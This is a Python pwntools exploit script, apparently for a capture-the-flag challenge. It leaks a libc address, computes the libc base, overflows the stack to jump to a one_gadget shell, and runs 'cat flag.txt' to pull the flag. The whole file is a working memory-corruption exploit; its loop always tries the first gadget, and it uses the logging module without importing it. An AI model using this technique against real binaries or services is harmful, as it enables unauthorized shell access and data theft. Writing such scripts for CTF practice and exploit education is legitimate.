from pwn import *
import detection
import re
import subprocess

context.log_level = 'ERROR'
logging.disable(logging.CRITICAL)
context.clear(arch='amd64')
# ------------------------------------- #
# exploit(binary: str)                  #
#                                       #
# INPUT:  filename of vulnerable binary #
# OUTPUT: remote flag                   #
# ------------------------------------- #
def exploit(binary: str):
    flag_regex = r'flag\{[^}]+\}'
    onegadgets = [0x4f2a5, 0x4f302, 0x10a2fc]
    url = f'ace-service-{binary}.chals.io'
    for item in onegadgets:
        #p = remote(url, 443, ssl=True, sni=url)
        #for item in onegadgets:
        p = process(binary)
        #pid = gdb.attach(p, 'b *vuln+88\ncontinue') 
        e = ELF(binary)
        libc = ELF('libc.so.6')
        #rop = ROP(binary)
        p.recvuntil(b'Leak: ')
        libc_leak = (p.recv(14))
        #print(libc_leak)
        #The hard-coding isn't ideal, but it's late
        if libc_leak[11:] == b'e40':
            libc_base = int(libc_leak, 16) - libc.symbols['printf']
        elif libc_leak[11:] == b'970':
            libc_base = int(libc_leak, 16) - libc.symbols['puts']
        elif libc_leak[11:] == b'390':
            libc_base = int(libc_leak, 16) - libc.symbols['rand']
        else:
            print('leak unrecognized')
            break
        onegadget = libc_base + onegadgets[0]
        #print(hex(onegadget))

        payload = b''

        payload += cyclic(detection.find_rip_offset(binary))
        payload += p64(onegadget)
        payload += b'\x00' * 0x80
        
        p.sendline(payload)
        #Since I'm going for a shell rather than a win function, there's no try and see here.
        #p.interactive()
        p.sendline(b'cat flag.txt')
        output = p.recvall(timeout=0.2)
        
        flag = re.findall(flag_regex, output.decode())
        if flag: # Success
            #print(flag)
            return flag[0]
        #else: # Failure
    return


